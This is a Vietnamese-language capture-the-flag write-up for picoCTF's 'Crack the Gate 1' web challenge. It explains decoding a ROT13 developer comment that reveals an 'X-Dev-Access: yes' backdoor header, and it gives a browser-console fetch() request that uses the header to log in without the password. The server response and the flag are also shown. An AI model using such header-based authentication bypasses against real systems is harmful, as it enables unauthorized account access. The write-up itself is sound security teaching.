# 🚩 Crack the Gate 1

## 📌 Thông tin

* **Category:** Web Exploitation
* **Difficulty:** Easy
* **Author:** Yahaya Meddy

---

## 📚 Mục lục

1. Phân tích đề bài
2. Khai thác lỗ hổng
3. Payload sử dụng
4. Flag
5. Bài học rút ra

---

## 🧠 Phân tích

Challenge cung cấp email của user mục tiêu:

```text id="j8e7jz"
ctf-player@picoctf.org
```

Nhưng không có password.

Mô tả còn gợi ý:

> It’s almost like the developer left a secret way in.

➡️ Đây là dấu hiệu rất mạnh cho thấy **developer backdoor**.

---

## 🔍 Kiểm tra Source Code

Xem source trang login (`Ctrl + U`) phát hiện comment ẩn:

```html id="c1pc5y"
<!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" -->
<!-- Remove before pushing to production! -->
```

Dòng này dùng **ROT13**.

Decode ra:

```text id="9j6pva"
NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes"
```

🔥 Đây chính là backdoor mà dev quên xóa trước khi deploy.

---

## 💀 Lỗ hổng

Server kiểm tra nếu request có header:

```http id="o4j1f0"
X-Dev-Access: yes
```

thì bỏ qua xác thực password.

---

## 🛠 Payload / Script

Mở DevTools (`F12`) → Console và chạy:

```javascript id="wbdz26"
fetch("/login", {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
    "X-Dev-Access": "yes"
  },
  body: JSON.stringify({
    email: "ctf-player@picoctf.org",
    password: "anything"
  })
})
.then(r => r.json())
.then(console.log)
```

---

## ✅ Kết quả trả về

```json id="t6q7sx"
{
  "success": true,
  "email": "ctf-player@picoctf.org",
  "firstName": "pico",
  "lastName": "player",
  "flag": "picoCTF{brut4_f0rc4_49d1d186}"
}
```

---

## 🏁 Flag

```html id="s1p4n8"
<font color="lime"><b>picoCTF{brut4_f0rc4_49d1d186}</b></font>
```

---

## 📚 Bài học rút ra

| Lỗi bảo mật                 | Mô tả                                     |
| --------------------------- | ----------------------------------------- |
| Debug Comment Leak          | Comment source code lộ thông tin nhạy cảm |
| Hidden Backdoor             | Header bypass authentication              |
| Production Misconfiguration | Quên xoá code test khi deploy             |

---

## 🔥 Kết luận

Đây là bài web dễ nhưng rất thực tế:
nhiều hệ thống production từng dính **debug route / hidden header bypass auth** giống hệt challenge này.

---

# 🎯 Flag cuối cùng

```text id="ib8n7u"
picoCTF{brut4_f0rc4_49d1d186}
```
